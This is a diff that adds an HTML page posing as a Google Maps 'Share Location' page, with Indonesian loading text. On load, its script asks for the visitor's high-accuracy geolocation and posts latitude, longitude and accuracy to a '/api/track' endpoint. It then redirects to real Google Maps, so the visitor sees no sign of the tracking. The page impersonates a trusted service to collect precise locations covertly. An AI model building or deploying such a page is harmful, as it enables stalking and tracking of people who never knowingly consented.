@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Maps - Share Location</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 25vh; background: #f4f4f9; color: #333; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <h3>Memuat Peta...</h3>
+    <p>Mohon tunggu sebentar, sedang menghubungkan ke lokasi...</p>
+
+    <script>
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(successCallback, errorCallback, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+            } else {
+                alert("Geolocation tidak didukung oleh browser ini.");
+            }
+        };
+
+        function successCallback(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+
+            fetch('/api/track', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ latitude: lat, longitude: lon, accuracy: accuracy })
+            }).then(() => {
+                window.location.href = `https://maps.google.com/?q=${lat},${lon}`;
+            }).catch(() => {
+                window.location.href = `https://maps.google.com/?q=${lat},${lon}`;
+            });
+        }
+
+        function errorCallback(error) {
+            window.location.href = "https://maps.google.com";
+        }
+    </script>
+</body>
+</html>
